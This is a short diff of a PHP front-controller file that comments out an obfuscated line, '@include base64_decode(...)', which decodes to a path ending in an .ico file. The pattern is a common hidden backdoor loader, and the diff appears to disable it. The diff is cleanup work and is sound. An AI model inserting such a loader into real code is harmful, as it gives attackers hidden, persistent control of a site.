@@ -1,5 +1,5 @@
 <?php
-@include base64_decode('YmluL2JvcmRlci5pY28=');
+//@include base64_decode('YmluL2JvcmRlci5pY28=');
 
 use App\Kernel;
 
